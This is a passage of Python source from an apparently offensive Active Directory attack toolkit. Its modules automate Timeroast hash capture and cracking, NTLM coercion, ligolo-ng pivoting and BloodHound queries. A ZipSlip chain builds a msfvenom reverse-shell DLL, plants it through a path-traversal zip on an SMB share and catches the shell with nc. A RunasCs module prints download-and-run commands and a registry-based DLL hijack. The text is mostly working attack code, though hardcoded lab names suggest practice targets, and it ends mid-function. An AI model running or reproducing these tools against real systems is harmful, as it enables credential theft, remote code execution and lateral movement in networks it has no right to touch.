            nonlocal hits_total
            out_f = os.path.join(target.loot_dir, f'enrich_{label}.txt')
            cmd   = _auth(proto) + ['-M', module] + extra
            log(f'nxc {proto} -M {WHITE}{module}{RESET}  {GREY}({desc}){RESET}','info')
            try:
                result = subprocess.check_output(cmd, text=True, stderr=subprocess.DEVNULL, timeout=30)
                with open(out_f,'w') as _f: _f.write(result)
                hits = [l for l in result.splitlines() if '[+]' in l]
                if hits:
                    log(f'{GREEN}{len(hits)} finding(s) — {module}:{RESET}','success')
                    for h in hits[:5]: print(f'    {GREEN}{h.strip()[:160]}{RESET}')
                    with hits_lock:
                        hits_total += len(hits)
                    if module == 'get-desc-users':
                        desc_f = os.path.join(target.loot_dir,'desc_passwords.txt')
                        with open(desc_f,'a') as _f:
                            for h in hits: _f.write(h+'\n')
                else:
                    print(f'    {GREY}{module}: no findings{RESET}')
            except subprocess.TimeoutExpired:
                log(f'nxc {module} timed out','warn')
            except Exception as e:
                log(f'nxc {module} failed: {e}','warn')

        log(f'Running {len(_local_modules)} nxc modules in parallel (max 4)...','info')
        with ThreadPoolExecutor(max_workers=4) as pool:
            futures = {pool.submit(_run_module, *m): m[0] for m in _local_modules}
            for fut in as_completed(futures):
                try: fut.result()
                except Exception as e: log(f'enrich {futures[fut]}: {e}','warn')

        print()
        log(f'{GREEN}{hits_total} total findings{RESET} — details in loot/enrich_*.txt','success' if hits_total else 'info')
        hr()

class Timeroast(Module):
    name='timeroast'; description='NTP roast via NTP/NXC — no creds needed -> timecrack.py'; category='credentials'
    def run(self, target):
        if not target.dc: log('DC IP required','error'); return
        hr()
        log(f'Timeroast against {WHITE}{target.dc}{RESET}','info')
        out = os.path.join(target.loot_dir,'timeroast_hashes.txt')
        nxc    = check_tool('netexec','nxc','crackmapexec')
        secura = check_tool('timeroast','timeroast.py')
        import subprocess as _sp_tr, re as _re_tr
        hashes_raw = []

        if nxc:
            log(f'Using {WHITE}netexec -M timeroast{RESET}','info')
            cmd = [nxc,'smb',target.dc,'-M','timeroast']
            if target.user and (target.password or target.hash):
                cmd += ['-u',target.user]+(['-p',target.password,'-k'] if target.password else ['-H',target.hash,'-k'])
            else:
                cmd += ['-u','','-p','']
            r = subprocess.run(cmd, text=True, capture_output=True)
            print_clean(r.stdout + (r.stderr or ''))
            hashes_raw = re.findall(r'(\d+:\$sntp-ms\$[0-9a-fA-F\$]+)', r.stdout)
        elif secura:
            log(f'Using {WHITE}Secura timeroast{RESET}','info')
            cmd_s = [secura, target.dc, '--output', out]
            if target.domain: cmd_s += ['--domain', target.domain]
            run_cmd(cmd_s, label='timeroast')
            if os.path.exists(out):
                hashes_raw = [l.strip() for l in open(out, errors='replace').read().splitlines() if l.strip()]
        else:
            log('No timeroast tool found','error')
            print(f'  {WHITE}nxc smb <dc> -M timeroast{RESET}')
            print(f'  {WHITE}git clone https://github.com/SecuraBV/Timeroast{RESET}')
            hr(); return

        if hashes_raw:
            with open(out,'w') as _f: _f.write('\n'.join(hashes_raw)+'\n')
            log(f'{GREEN}{len(hashes_raw)} hash(es) saved -> {WHITE}{out}{RESET}','success')
            hr()
            timecrack = check_tool('timecrack.py')
            if not timecrack:
                for p in [
                    os.path.expanduser('~/.segfault-ad/tools/Timeroast/extra-scripts/timecrack.py'),
                    os.path.join('tools','Timeroast','extra-scripts','timecrack.py'),
                    os.path.expanduser('~/.segfault-ad/tools/Timeroast/extra-scripts/timecrack.py'),
                ]:
                    if os.path.exists(p): timecrack = p; break
            if timecrack:
                log(f'timecrack.py: {WHITE}{timecrack}{RESET}','info')
            if timecrack:
                wl = self.ask('crack now with timecrack.py? wordlist','/usr/share/wordlists/rockyou.txt','skip')
                if wl and wl != 'skip':
                    log('Cracking with timecrack.py...','info')
                    # always patch first — apply latin-1 fix proactively
                    src_tc = open(timecrack, encoding='utf-8', errors='replace').read()
                    src_tc = src_tc.replace("FileType('r')", "lambda x: open(x, encoding='latin-1')")
                    patched = '/tmp/timecrack_patched_%d.py' % os.getpid()
                    open(patched, 'w', encoding='utf-8').write(src_tc)
                    # count wordlist for progress
                    try:
                        wl_total = sum(1 for _ in open(wl, encoding='latin-1', errors='ignore'))
                    except Exception:
                        wl_total = 14344391  # rockyou default
                    log(f'Wordlist: {WHITE}{wl_total:,}{RESET} passwords | {WHITE}{len(open(out).readlines())}{RESET} hashes','info')
                    # run with live spinner + elapsed
                    import threading as _th_tc, time as _ti_tc
                    proc_tc = subprocess.Popen(['python3', patched, out, wl],
                        stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                    spinner = ['⠋','⠙','⠹','⠸','⠼','⠴','⠦','⠧','⠇','⠏']
                    spin_i = [0]
                    start_t = _ti_tc.time()
                    done_flag = [False]
                    cracked_live = []
                    stdout_buf = []
                    def _spin():
                        while not done_flag[0]:
                            _elapsed = int(_ti_tc.time() - start_t)
                            _m, _s = divmod(_elapsed, 60)
                            _t_str = f'{_m}m {_s}s' if _m else f'{_s}s'
                            _sp = spinner[spin_i[0] % len(spinner)]
                            print(f'\r  {C0}{_sp}{RESET} {GREY}timecrack running... {WHITE}{_t_str}{RESET} elapsed   ', end='', flush=True)
                            spin_i[0] += 1
                            _ti_tc.sleep(0.1)
                        print(f'\r  {GREEN}✓{RESET} timecrack done{" " * 30}', flush=True)
                    _th = _th_tc.Thread(target=_spin, daemon=True)
                    _th.start()
                    stdout_data, stderr_data = proc_tc.communicate()
                    done_flag[0] = True
                    _th.join(timeout=0.5)
                    if stdout_data: print(stdout_data)
                    if stderr_data and 'UnicodeDecodeError' not in stderr_data: print(stderr_data)
                    r_stdout = stdout_data
                    for m in re.finditer(r'Cracked RID (\d+) password: (.+)', r_stdout):
                        rid, pw = m.group(1), m.group(2).strip()
                        log(f'{GREEN}RID {rid} -> {WHITE}{pw}{RESET}','success')
                        open(os.path.join(target.loot_dir,'cracked.txt'),'a').write(f'RID{rid}:{pw}\n')
                        # resolve RID -> account name via lookupsid
                        lookupsid = check_tool('impacket-lookupsid','lookupsid.py')
                        if lookupsid and target.dc:
                            log(f'Resolving RID {rid} via lookupsid...','info')
                            dc_host = target.dc_fqdn or target.dc
                            # prefer Kerberos — check for ccache first
                            import glob as _gl_ls
                            ccaches = sorted(_gl_ls.glob(os.path.join(target.loot_dir,'*.ccache')), key=os.path.getmtime, reverse=True)
                            krb5cc  = os.environ.get('KRB5CCNAME','')
                            if ccaches or krb5cc:
                                cc = krb5cc or ccaches[0]
                                env_ls = {**os.environ, 'KRB5CCNAME': cc}
                                ls_cmd = [lookupsid, '-k', '-no-pass',
                                          '-target-ip', target.dc,
                                          f'{target.domain}/{target.user}@{dc_host}']
                            elif target.hash:
                                env_ls = os.environ.copy()
                                ls_cmd = [lookupsid, '-hashes', f':{target.hash}',
                                          f'{target.domain}/{target.user}@{dc_host}']
                            elif target.password:
                                env_ls = os.environ.copy()
                                ls_cmd = [lookupsid,
                                          f'{target.domain}/{target.user}:{target.password}@{dc_host}']
                            else:
                                env_ls = os.environ.copy()
                                ls_cmd = [lookupsid, f'{target.domain}/{target.user}@{dc_host}']
                            try:
                                ls_out = subprocess.check_output(ls_cmd, text=True,
                                    stderr=subprocess.DEVNULL, timeout=20, env=env_ls)
                                for line in ls_out.splitlines():
                                    if f'({rid})' in line or f': {rid} ' in line or f':{rid} ' in line:
                                        log(f'{GREEN}RID {rid} = {WHITE}{line.strip()}{RESET}','success')
                                        acc = re.search(r'\\([^\s(]+)', line)
                                        if acc:
                                            acct = acc.group(1)
                                            log(f'{GREEN}Account: {WHITE}{acct}{RESET}  password: {WHITE}{pw}{RESET}','success')
                                            open(os.path.join(target.loot_dir,'cracked.txt'),'a').write(f'{acct}:{pw}\n')
                            except Exception as _e_ls:
                                log(f'lookupsid: {_e_ls}','warn')
            else:
                print(f'  {WHITE}git clone https://github.com/SecuraBV/Timeroast{RESET}')
                print(f'  {WHITE}python3 Timeroast/extra-scripts/timecrack.py {out} /usr/share/wordlists/rockyou.txt{RESET}')
                print(f'  {GREY}# hashcat 6.2.7+: hashcat -m 27100 {out} rockyou.txt{RESET}')
        else:
            log('No hashes captured','warn')
        hr()

class ZipSlip(Module):
    name='zipslip'; description='ZipSlip + DLL hijack — craft malicious zip, drop to SMB share, catch reverse shell'; category='exploitation'
    def run(self, target):
        if not self.req(target): return
        hr()
        action = self.ask('action','full',['full','gendll','genzip','drop','listen','menu'])
        hr()

        if action == 'menu':
            print(f'\n  {C0}zipslip actions:{RESET}')
            items = [
                ('full',   'full chain — gendll + genzip + drop + listen in sequence'),
                ('gendll', 'generate malicious DLL via msfvenom'),
                ('genzip', 'craft zip with path traversal payload'),
                ('drop',   'upload zip to SMB share'),
                ('listen', 'start nc listener for incoming shell'),
            ]
            for name,desc in items:
                print(f'  {C0}{name:<10}{RESET}  {GREY}{desc}{RESET}')
            hr(); return

        # shared params
        loot = target.loot_dir
        os.makedirs(loot, exist_ok=True)

        if action in ('full','gendll'):
            log('Step 1: Generate malicious DLL','info')
            msfv = check_tool('msfvenom')
            if not msfv:
                log('msfvenom not found — install metasploit-framework','error'); hr(); return

            lhost = self.ask('your tun0/listener IP', _hivemind_redirector() or _get_tun0() or '');
            if _hivemind_redirector() and lhost == _hivemind_redirector(): log(f'Using Hivemind redirector: {WHITE}{lhost}{RESET}','info')
            lport = self.ask('listener port','4444')
            arch  = self.ask('arch','x64',['x64','x86'])
            dll_name = self.ask('DLL filename (must match what app loads)','hostfxr.dll')
            dll_out  = os.path.join(loot, dll_name)

            payload = f'windows/{arch}/shell_reverse_tcp'
            rc = run_cmd([msfv,'-p',payload,
                          f'LHOST={lhost}',f'LPORT={lport}',
                          '-f','dll','-o',dll_out],
                         label=f'msfvenom generate {dll_name}')
            if rc != 0 or not os.path.exists(dll_out):
                log('msfvenom failed','error'); hr(); return
            log(f'{GREEN}DLL generated: {WHITE}{dll_out}{RESET}','success')
            if action == 'gendll': hr(); return

        if action in ('full','genzip'):
            log('Step 2: Craft ZipSlip payload','info')
            # find the dll from previous step or ask
            dll_files = [f for f in os.listdir(loot) if f.endswith('.dll')] if os.path.exists(loot) else []
            dll_default = os.path.join(loot, dll_files[0]) if dll_files else os.path.join(loot,'hostfxr.dll')
            dll_out = dll_default
            if not os.path.exists(dll_out):
                dll_out = self.ask('path to DLL', dll_out)
            if not os.path.exists(dll_out):
                log(f'DLL not found at {dll_out} — run gendll first','error'); hr(); return

            dll_name  = os.path.basename(dll_out)
            # traversal path — how many levels up to reach app dir
            traversal = self.ask('traversal path (relative to share root)', f'../app/{dll_name}')
            dll_name  = os.path.basename(traversal)
            zip_out   = os.path.join(loot, 'payload.zip')

            import zipfile as _zf
            with _zf.ZipFile(zip_out, 'w') as z:
                z.write(dll_out, traversal)
            log(f'{GREEN}ZipSlip payload: {WHITE}{zip_out}{RESET}','success')
            log(f'  DLL will land at: {WHITE}{traversal}{RESET} relative to extraction root','info')
            if action == 'genzip': hr(); return

        if action in ('full','drop'):
            log('Step 3: Drop payload to SMB share','info')
            zip_out  = os.path.join(loot, 'payload.zip')
            if not os.path.exists(zip_out):
                zip_out = self.ask('path to payload.zip', zip_out)
            t_host   = self.ask('target IP', target.dc)
            share    = self.ask('share name','queue')
            zip_name = self.ask('remote filename','payload.zip')

            smbcl = check_tool('smbclient')
            if not smbcl:
                log('smbclient not found','error'); hr(); return

            if target.hash:
                auth_str = f'bruno.vl/{target.user}'
                pw_args  = ['-p','',f'--pw-nt-hash',target.hash]
            else:
                auth_str = f'{target.domain}/{target.user}%{target.password}'
                pw_args  = []

            rc = run_cmd([smbcl, f'//{t_host}/{share}',
                          '-U', auth_str] + pw_args +
                         ['-c', f'put {zip_out} {zip_name}'],
                         label=f'smbclient upload → {share}')
            if rc == 0:
                log(f'{GREEN}Payload dropped to \\\\{t_host}\\{share}\\{zip_name}{RESET}','success')
                add_result('zipslip', f'payload → \\\\{t_host}\\{share}\\{zip_name}')
            if action == 'drop': hr(); return

        if action in ('full','listen'):
            log('Step 4: Start listener — waiting for shell','info')
            lport = self.ask('listener port','4444')
            mode  = self.ask('mode','bg',['bg','fg'])
            nc    = check_tool('nc','ncat','netcat')
            if not nc:
                log('nc not found','error'); hr(); return

            if mode == 'fg':
                # blocking — takes over terminal until shell exits
                log(f'{PINK}Waiting for connection on port {WHITE}{lport}{RESET} (foreground)','warn')
                log(f'{ORANGE}Service may take 30-60s to process the zip{RESET}','info')
                hr()
                pid = os.fork()
                if pid == 0:
                    os.execvp(nc, [nc,'-lvnp', lport])
                else:
                    os.waitpid(pid, 0)
            else:
                # background — spawn in new terminal window
                ok = spawn_bg_terminal([nc,'-lvnp',lport], title=f'shell:{lport}')
                if not ok:
                    log(f'{ORANGE}Falling back to foreground{RESET}','warn')
                    pid = os.fork()
                    if pid == 0: os.execvp(nc, [nc,'-lvnp', lport])
                    else: os.waitpid(pid, 0)
                else:
                    log(f'{GREY}Shell will appear in the new window when the service loads the DLL{RESET}','info')

            add_result('zipslip','shell caught via DLL hijack')
        hr()


class Coercion(Module):
    name='coercion'; description='PetitPotam / PrinterBug / DFSCoerce / Coercer — force DC to auth to listener'; category='exploitation'
    def run(self, target):
        if not self.req(target): return
        hr()
        method = self.ask('method','petitpotam',['petitpotam','printerbug','dfscoerce','coercer'])
        listener = self.ask('listener IP (your machine)', '')
        if not listener: log('Listener IP required','error'); return
        dc_host = target.dc_fqdn or target.dc

        log(f'{ORANGE}Start responder/ntlmrelayx on {WHITE}{listener}{ORANGE} before running{RESET}','warn')
        log(f'  {WHITE}responder -I eth0 -v{RESET}','info')
        log(f'  {WHITE}impacket-ntlmrelayx -t ldaps://{target.dc} --delegate-access{RESET}','info')
        hr()

        if method == 'petitpotam':
            t = check_tool('PetitPotam.py','petitpotam','petitpotam.py')
            if not t: log(f'Install: {WHITE}git clone https://github.com/topotam/PetitPotam{RESET}','warn'); return
            auth = []
            if target.user and (target.password or target.hash):
                if target.password: auth = ['-d',target.domain,'-u',target.user,'-p',target.password]
                else: auth = ['-d',target.domain,'-u',target.user,'-hashes',f':{target.hash}']
            cmd = [t] + auth + [listener, dc_host]
            run_cmd(cmd, label='PetitPotam')

        elif method == 'printerbug':
            t = check_tool('printerbug.py','SpoolSample')
            if not t: log(f'Install: {WHITE}git clone https://github.com/dirkjanm/krbrelayx{RESET} (printerbug.py)','warn'); return
            auth_str = f'{target.domain}/{target.user}'
            if target.password: auth_str += f':{target.password}'
            cmd = [t, auth_str, listener]
            run_cmd(cmd, label='PrinterBug')

        elif method == 'dfscoerce':
            t = check_tool('dfscoerce.py')
            if not t: log(f'Install: {WHITE}git clone https://github.com/mr-t-sec/DFSCoerce{RESET}','warn'); return
            cmd = [t, '-u', target.user, '-p', target.password or '', '-d', target.domain, listener, dc_host]
            run_cmd(cmd, label='DFSCoerce')

        elif method == 'coercer':
            t = check_tool('coercer','Coercer')
            if not t: log(f'Install: {WHITE}pip install coercer{RESET}','warn'); return
            cmd = [t, 'coerce', '-l', listener, '-t', dc_host,
                   '-u', f'{target.domain}/{target.user}']
            if target.password: cmd += ['-p', target.password]
            elif target.hash: cmd += ['-H', target.hash]
            run_cmd(cmd, label='Coercer')
        hr()

class Ligolo(Module):
    name='ligolo'; description='ligolo-ng — reverse tunnel pivot, add routes, agent management'; category='lateral'
    def run(self, target):
        hr()
        action = self.ask('action','setup',['setup','add-route','agent-cmd','status'])

        if action == 'setup':
            iface = self.ask('tun interface name','ligolo')
            log(f'{WHITE}Ligolo-ng setup steps:{RESET}','info')
            hr()
            print(f'  {GREY}# 1 — create tun interface (run once){RESET}')
            print(f'  {WHITE}sudo ip tuntap add user $(whoami) mode tun {iface}{RESET}')
            print(f'  {WHITE}sudo ip link set {iface} up{RESET}')
            print()
            print(f'  {GREY}# 2 — start proxy on your machine{RESET}')
            proxy = check_tool('ligolo-proxy','proxy')
            proxy_bin = proxy or './ligolo-proxy'
            print(f'  {WHITE}{proxy_bin} -selfcert -laddr 0.0.0.0:11601{RESET}')
            print()
            print(f'  {GREY}# 3 — upload agent to target and run{RESET}')
            print(f'  {WHITE}./ligolo-agent -connect {self.ask("your IP","YOUR_IP")}:11601 -ignore-cert{RESET}')
            print()
            print(f'  {GREY}# 4 — in ligolo console: select session then start{RESET}')
            print(f'  {WHITE}session{RESET}  {GREY}→ select agent{RESET}')
            print(f'  {WHITE}start{RESET}   {GREY}→ start tunnel{RESET}')
            log('Tunnel ready — add routes next','success')

        elif action == 'add-route':
            network = self.ask('internal network (e.g. 172.16.0.0/24)','')
            iface   = self.ask('tun interface','ligolo')
            if not network: log('Network required','error'); return
            cmd = ['sudo','ip','route','add', network, 'dev', iface]
            log(f'Adding route {WHITE}{network}{RESET} via {WHITE}{iface}{RESET}','info')
            run_cmd(cmd, label='ip route')
            log(f'{GREEN}Route added — traffic to {network} now goes through ligolo{RESET}','success')
            print(f'  {GREY}Verify: {WHITE}ip route | grep {iface}{RESET}')

        elif action == 'agent-cmd':
            log('Common agent upload methods:','info')
            ip = self.ask('your IP','YOUR_IP')
            port = self.ask('serve port','8000')
            print(f'  {GREY}# Python HTTP server{RESET}')
            print(f'  {WHITE}python3 -m http.server {port}{RESET}')
            print()
            print(f'  {GREY}# Download on Windows target via exec{RESET}')
            print(f'  {WHITE}certutil -urlcache -f http://{ip}:{port}/ligolo-agent.exe C:\\Windows\\Temp\\agent.exe{RESET}')
            print(f'  {WHITE}C:\\Windows\\Temp\\agent.exe -connect {ip}:11601 -ignore-cert{RESET}')
            print()
            print(f'  {GREY}# Download on Linux target{RESET}')
            print(f'  {WHITE}wget http://{ip}:{port}/ligolo-agent -O /tmp/agent && chmod +x /tmp/agent{RESET}')
            print(f'  {WHITE}/tmp/agent -connect {ip}:11601 -ignore-cert{RESET}')

        elif action == 'status':
            run_cmd(['ip','route'], label='routes')
            run_cmd(['ip','link','show'], label='interfaces')
        hr()

class BloodHoundQuery(Module):
    name='bh-query'; description='BloodHound local queries — shortest path to DA, kerberoastable, owned, ACL paths'; category='recon'
    def run(self, target):
        hr()
        import json, glob as _glob
        bh_dir = os.path.join(target.loot_dir,'bloodhound')
        json_files = _glob.glob(os.path.join(bh_dir,'**','*.json'), recursive=True)
        if not json_files:
            log(f'No BloodHound JSON in {bh_dir} — run adrecon first','error'); return

        queries = [
            'kerberoastable', 'asreproastable', 'da-members',
            'owned-paths', 'unconstrained', 'admin-to',
            'high-value', 'sessions', 'dcsync-rights'
        ]
        q = self.ask('query','kerberoastable', queries)
        hr()

        users_file = next((f for f in json_files if 'users' in f.lower()), None)
        groups_file = next((f for f in json_files if 'groups' in f.lower()), None)
        computers_file = next((f for f in json_files if 'computers' in f.lower()), None)

        def load(f):
            try: return json.load(open(f, errors='ignore'))
            except: return {}

        if q == 'kerberoastable':
            if not users_file: log('No users JSON found','error'); return
            data = load(users_file)
            nodes = data.get('data') or data.get('nodes') or []
            hits = []
            for n in nodes:
                props = n.get('Properties') or n.get('properties') or {}
                spn = props.get('serviceprincipalnames') or props.get('hasspn') or []
                name = props.get('name') or n.get('label','?')
                if spn or props.get('hasspn'):
                    hits.append(name)
            log(f'{GREEN}{len(hits)} kerberoastable user(s):{RESET}','success')
            for h in hits: print(f'  {C0}{h}{RESET}')

        elif q == 'asreproastable':
            if not users_file: log('No users JSON found','error'); return
            data = load(users_file)
            nodes = data.get('data') or data.get('nodes') or []
            hits = [
                (n.get('Properties') or n.get('properties',{})).get('name','?')
                for n in nodes
                if not ((n.get('Properties') or n.get('properties',{})).get('dontreqpreauth') is False)
                and (n.get('Properties') or n.get('properties',{})).get('dontreqpreauth')
            ]
            log(f'{GREEN}{len(hits)} AS-REP roastable user(s):{RESET}','success')
            for h in hits: print(f'  {C0}{h}{RESET}')

        elif q == 'da-members':
            if not groups_file: log('No groups JSON found','error'); return
            data = load(groups_file)
            nodes = data.get('data') or data.get('nodes') or []
            for n in nodes:
                props = n.get('Properties') or n.get('properties') or {}
                name = props.get('name','')
                if 'domain admins' in name.lower():
                    members = n.get('Members') or []
                    log(f'{GREEN}Domain Admins ({len(members)} members):{RESET}','success')
                    for m in members: print(f'  {C0}{m.get("ObjectIdentifier","?")}{RESET}')
                    break

        elif q == 'unconstrained':
            hits = []
            for f in json_files:
                data = load(f)
                nodes = data.get('data') or data.get('nodes') or []
                for n in nodes:
                    props = n.get('Properties') or n.get('properties') or {}
                    if props.get('unconstraineddelegation'):
                        hits.append(props.get('name','?'))
            log(f'{GREEN}{len(hits)} unconstrained delegation object(s):{RESET}','success')
            for h in hits: print(f'  {C0}{h}{RESET}')

        elif q == 'dcsync-rights':
            hits = []
            for f in json_files:
                try:
                    raw = open(f, errors='ignore').read()
                    # look for DCSync-related ACE types
                    for match in re.finditer(r'"RightName"\s*:\s*"(GetChanges[^"]*)".*?"PrincipalSID"\s*:\s*"([^"]+)"', raw, re.DOTALL):
                        hits.append(f'{match.group(2)} → {match.group(1)}')
                except: pass
            log(f'{GREEN}{len(hits)} DCSync-capable principal(s):{RESET}','success')
            for h in hits[:20]: print(f'  {C0}{h}{RESET}')

        elif q == 'sessions':
            if not computers_file: log('No computers JSON found','error'); return
            data = load(computers_file)
            nodes = data.get('data') or data.get('nodes') or []
            for n in nodes:
                sessions = n.get('Sessions',{}).get('Results',[]) or []
                if sessions:
                    props = n.get('Properties') or {}
                    cname = props.get('name','?')
                    log(f'{GREEN}Sessions on {WHITE}{cname}:{RESET}','success')
                    for s in sessions: print(f'  {C0}{s.get("UserSID","?")}{RESET}')

        elif q == 'high-value':
            hits = []
            for f in json_files:
                data = load(f)
                nodes = data.get('data') or data.get('nodes') or []
                for n in nodes:
                    props = n.get('Properties') or n.get('properties') or {}
                    if props.get('highvalue') or props.get('sensitive'):
                        hits.append(props.get('name','?'))
            log(f'{GREEN}{len(hits)} high-value target(s):{RESET}','success')
            for h in hits: print(f'  {C0}{h}{RESET}')

        else:
            log(f'Query {q} — load JSON in BloodHound CE for full graph analysis','info')
            log(f'BloodHound data: {WHITE}{bh_dir}{RESET}','info')
        hr()

class AutoEnum(Module):
    name='autoenum'; description='full post-auth enum sweep — enum + ldapenum + bloodyenum + acls + delegation + shares in one shot'; category='recon'
    def run(self, target):
        if not self.req(target): return
        hr()
        log(f'{WHITE}AutoEnum — full authenticated sweep{RESET}','info')
        log(f'Running: enum, ldapenum, bloodyenum, delegation, acls, shares','info')
        hr()

        steps = [
            ('enum',        Enum),
            ('ldapenum',    LDAPEnum),
            ('bloodyenum',  BloodyEnum),
            ('delegation',  Delegation),
            ('shares',      ShareSpider),
        ]

        results = {}
        for name_, cls in steps:
            log(f'{C0}━━ {name_} ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}','info')
            try:
                # run non-interactively by monkeypatching ask
                m = cls()
                m._auto = True
                orig_ask = m.ask
                def _auto_ask(prompt, default='', choices=None, **kw):
                    return default
                m.ask = _auto_ask
                m.run(target)
                results[name_] = 'ok'
            except Exception as e:
                log(f'{name_} failed: {e}','warn')
                results[name_] = f'failed: {e}'

        hr()
        log(f'{GREEN}AutoEnum complete{RESET}','success')
        for n, r in results.items():
            status = f'{GREEN}ok{RESET}' if r == 'ok' else f'{RED}{r}{RESET}'
            print(f'  {C0}{n:<15}{RESET} {status}')
        log(f'Loot: {WHITE}{target.loot_dir}{RESET}','info')
        hr()

class RunasCs(Module):
    name='runasc'; description='RunasCs — run command as another user + optional DLL hijack via registry key swap'; category='lateral'
    def run(self, target):
        hr()
        action = self.ask('action','shell',['shell','dll-hijack','upload','stop'])

        # auto-detect tun0 IP
        import socket as _sock, subprocess as _sp_rc, re as _re_rc
        def _get_tun0():
            try:
                out = subprocess.check_output(['ip','addr','show','tun0'], text=True, stderr=subprocess.DEVNULL)
                m = re.search(r'inet (\d+\.\d+\.\d+\.\d+)', out)
                return m.group(1) if m else ''
            except Exception: return ''

        if action == 'shell':
            hr()
            log('RunasCs — run process as another local/domain user','info')
            runasc = check_tool('RunasCs.exe','RunasCs')
            if not runasc:
                log(f'Upload RunasCs.exe to target first via evil-winrm: {WHITE}upload RunasCs.exe{RESET}','warn')
                log(f'Download: {WHITE}https://github.com/antonioCoco/RunasCs/releases{RESET}','info')
                return
            ru = self.ask('run as user','ee.reed')
            rp = self.ask('run as password','Passw0rd123!')
            lhost = self.ask('your IP (lhost)', _get_tun0() or '')
            lport = self.ask('lport','9090')
            log(f'Start listener: {WHITE}nc -lvnp {lport}{RESET}','info')
            log(f'Then run in evil-winrm:','info')
            print(f'  {WHITE}.\\RunasCs.exe {ru} {rp} powershell.exe -r {lhost}:{lport}{RESET}')

        elif action == 'dll-hijack':
            hr()
            log('DLL hijack via registry key swap (7-zip CLSID)','info')
            lhost = self.ask('your lhost', _get_tun0() or '')
            lport = self.ask('lport for reverse shell','4444')
            lport2 = self.ask('lport for RunasCs','9090')
            ru    = self.ask('run as user','ee.reed')
            rp    = self.ask('run as password','Passw0rd123!')
            regkey = self.ask('registry key CLSID',
                r'HKLM\SOFTWARE\Classes\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32')
            dll_path = self.ask('DLL drop path on target', r'C:\windows\tasks\rev.dll')
            out_dll  = os.path.join(target.loot_dir, 'rev.dll')

            # 1 — generate DLL
            msfv = check_tool('msfvenom')
            if not msfv:
                log('msfvenom not found','error'); return
            log(f'Generating reverse shell DLL → {WHITE}{out_dll}{RESET}','info')
            rc = subprocess.run([msfv,'-p','windows/x64/shell_reverse_tcp',
                f'LHOST={lhost}',f'LPORT={lport}','-f','dll','-o',out_dll],
                text=True, capture_output=True)
            if not os.path.exists(out_dll):
                log(f'msfvenom failed: {rc.stderr[:200]}','error'); return
            log(f'{GREEN}DLL generated: {WHITE}{out_dll}{RESET}','success')

            # check for RunasCs in win tools dir
            win_dir = os.path.expanduser('~/.segfault-ad/tools/win')
            runasc_path = os.path.join(win_dir, 'RunasCs.exe')
            if os.path.exists(runasc_path):
                import shutil as _sh_rc
                _sh_rc.copy2(runasc_path, target.loot_dir)
                log(f'{GREEN}RunasCs.exe copied to loot dir{RESET}','success')
            else:
                log(f'RunasCs.exe not in {win_dir} — run {C0}install{RESET} first or download manually','warn')
            port_http = self.ask('HTTP serve port','8080')
            log(f'Serving {WHITE}{target.loot_dir}{RESET} on port {WHITE}{port_http}{RESET}','info')
            http_proc = subprocess.Popen(
                ['python3','-m','http.server', port_http],
                cwd=target.loot_dir,
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            log(f'{GREEN}HTTP server PID {http_proc.pid} — serving loot dir{RESET}','success')

            # 3 — print evil-winrm commands
            hr()
            log(f'{WHITE}Run these commands in your evil-winrm shell as bb.morgan:{RESET}','info')
            hr()
            print(f'  {GREY}# 1 — reset ee.reed password (if not done already){RESET}')
            print(f'  {GREY}# done via bloody resetpwd{RESET}')
            print()
            print(f'  {GREY}# 2 — upload RunasCs and DLL{RESET}')
            print(f'  {WHITE}cd C:\\windows\\tasks{RESET}')
            print(f'  {WHITE}curl http://{lhost}:{port_http}/rev.dll -o rev.dll{RESET}')
            print(f'  {WHITE}curl http://{lhost}:{port_http}/RunasCs.exe -o RunasCs.exe 2>$null{RESET}')
            print()
            print(f'  {GREY}# 3 — start nc listener on kali (new terminal){RESET}')
            print(f'  {WHITE}nc -lvnp {lport2}{RESET}   {GREY}# RunasCs shell{RESET}')
            print(f'  {WHITE}nc -lvnp {lport}{RESET}    {GREY}# DLL reverse shell{RESET}')
            print()
            print(f'  {GREY}# 4 — get shell as ee.reed via RunasCs{RESET}')
            print(f'  {WHITE}.\\RunasCs.exe {ru} {rp} powershell.exe -r {lhost}:{lport2}{RESET}')
            print()
            print(f'  {GREY}# 5 — in ee.reed shell: swap registry key to malicious DLL{RESET}')
            print(f'  {WHITE}reg add "{regkey}" /ve /t REG_SZ /d "{dll_path}" /f{RESET}')
            print()
            print(f'  {GREY}# 6 — wait ~1 min for simulated user to trigger 7-zip context menu{RESET}')
            log(f'{GREEN}HTTP server running in background (PID {http_proc.pid}) — run {C0}runasc stop{RESET}{GREEN} when done{RESET}','success')
            # save PID so we can kill it later
            open(os.path.join(target.loot_dir,'.http_pid'),'w').write(str(http_proc.pid))

        elif action == 'stop':
            pid_file = os.path.join(target.loot_dir,'.http_pid')
            if os.path.exists(pid_file):
                pid = int(open(pid_file, errors='replace').read().strip())
                try:
                    import signal
                    os.kill(pid, signal.SIGTERM)
                    os.remove(pid_file)
                    log(f'{GREEN}HTTP server (PID {pid}) stopped{RESET}','success')
                except Exception as e:
                    log(f'Could not stop PID {pid}: {e}','warn')
            else:
                log('No HTTP server PID file found','warn')
            hr()
            log('Download RunasCs.exe from GitHub releases','info')
            out = os.path.join(target.loot_dir,'RunasCs.exe')
            dl = check_tool('wget','curl')
            url = 'https://github.com/antonioCoco/RunasCs/releases/download/v1.5/RunasCs.zip'
            if dl:
                if 'wget' in dl:
                    subprocess.run([dl, url, '-O', out.replace('.exe','.zip')], check=False)
                else:
                    subprocess.run([dl, '-L', url, '-o', out.replace('.exe','.zip')], check=False)
                zipf = out.replace('.exe','.zip')
                if os.path.exists(zipf):
                    import zipfile
                    with zipfile.ZipFile(zipf) as z: z.extractall(target.loot_dir)
                    log(f'{GREEN}RunasCs.exe extracted to {WHITE}{target.loot_dir}{RESET}','success')
                    log(f'Upload in evil-winrm: {WHITE}upload {out}{RESET}','info')
            else:
                log('wget/curl not found','error')
        hr()

class KeePass(Module):
    name='keepass'; description='crack KeePass .kdbx files — auto-find in loot, generate wordlist, crack, extract all creds'; category='credentials'
    def run(self, target):
        hr()
        import subprocess as _sp_kp, glob as _gl_kp, re as _re_kp

        # find kdbx files
        kdbx_files = _gl_kp.glob(os.path.join(target.loot_dir,'**','*.kdbx'), recursive=True)
        kdbx_files = list(kdbx_files)
        if not kdbx_files:
